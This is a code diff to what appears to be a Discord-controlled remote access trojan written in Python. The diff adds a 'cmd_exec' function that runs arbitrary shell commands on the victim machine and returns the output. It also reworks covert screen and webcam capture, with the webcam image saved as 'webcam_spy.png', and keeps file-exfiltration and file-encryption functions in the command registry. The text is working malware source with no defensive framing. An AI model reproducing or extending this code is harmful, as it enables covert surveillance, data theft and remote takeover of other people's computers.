@@ -24,8 +24,43 @@ def encrypt_file(filepath):
     except Exception as e:
         return None
 
-# --- PAYLOADS ---
+# --- NEW: RCE PAYLOAD ---
+def run_terminal_command(command_str):
+    """
+    Executes a shell command and returns the output.
+    """
+    if not command_str: 
+        return "⚠️ Error: You must provide a command. Example: ⚡ whoami"
+    
+    try:
+        # Run the command
+        # shell=True allows using pipes and system variables
+        result = subprocess.run(
+            command_str, 
+            shell=True, 
+            capture_output=True, 
+            text=True, 
+            timeout=15  # Safety timeout
+        )
+        
+        # Combine StdOut and StdErr
+        output = result.stdout + result.stderr
+        
+        if not output:
+            return "✅ Command executed successfully (No text output)."
+            
+        # Check Discord Limit (2000 chars). We leave buffer for the code block.
+        if len(output) > 1900:
+            return f"⚠️ Output too long ({len(output)} chars). Truncated:\n{output[:1900]}..."
+            
+        return output
 
+    except subprocess.TimeoutExpired:
+        return "⚠️ Error: Command timed out (took longer than 15s)."
+    except Exception as e:
+        return f"⚠️ Execution Error: {str(e)}"
+
+# --- EXISTING PAYLOADS ---
 def get_system_info(args=None):
     data = f"🖥️ OS: {platform.system()} {platform.release()}\n"
     data += f"👤 Node: {platform.node()}\n"
@@ -35,37 +70,28 @@ def try_everything_snapshot(args=None):
     filename = os.path.join(config.TEMP_DIR, "evidence.png")
     if os.path.exists(filename): os.remove(filename)
     
-    status_log = ""
-
-    # 1. Try MSS (Screen)
+    log = ""
+    # 1. Try Screen
     try:
         with mss() as sct:
             sct.shot(mon=1, output=filename)
         if os.path.exists(filename) and os.path.getsize(filename) > 0:
             return discord.File(filename)
     except Exception as e:
-        status_log += f"[Screen Failed: {str(e)}] "
+        log += f"[Screen: {e}] "
 
-    # 2. Try Webcam (Linux Fallback) - WITH DEBUGGING
+    # 2. Try Webcam
     try:
-        print("[*] Attempting Webcam...")
-        # We removed stderr=subprocess.DEVNULL to see errors in terminal
-        result = subprocess.run(
+        subprocess.run(
             ["fswebcam", "-r", "1280x720", "--no-banner", "-S", "20", filename],
             capture_output=True, text=True, timeout=5
         )
-        
-        if result.returncode == 0 and os.path.exists(filename):
+        if os.path.exists(filename):
             return discord.File(filename, filename="webcam_spy.png")
-        else:
-            # CAPTURE THE ERROR
-            status_log += f"[Webcam Error: {result.stderr}]"
-            
     except Exception as e:
-        status_log += f"[Webcam Crash: {str(e)}]"
+        log += f"[Cam: {e}]"
 
-    # Return the log so we know what happened
-    return f"⚠️ BLIND AGENT. Debug Log: {status_log}"
+    return f"⚠️ BLIND AGENT. Log: {log}"
 
 def exfiltrate_file(filepath):
     if not filepath: return "⚠️ Error: No file path."
@@ -79,7 +105,7 @@ def exfiltrate_file(filepath):
         return f"⚠️ Exfil Error: {str(e)}"
 
 def ping_pong(args=None):
-    return "🏓 Pong!"
+    return "🏓 Pong! Agent ready."
 
 def remote_exit(args=None):
     sys.exit(0)
@@ -90,5 +116,6 @@ EXEC_REGISTRY = {
     'cmd_screenshot': try_everything_snapshot,
     'cmd_ping': ping_pong,
     'cmd_exfil': exfiltrate_file,
-    'cmd_exit': remote_exit
+    'cmd_exit': remote_exit,
+    'cmd_exec': run_terminal_command  
 }
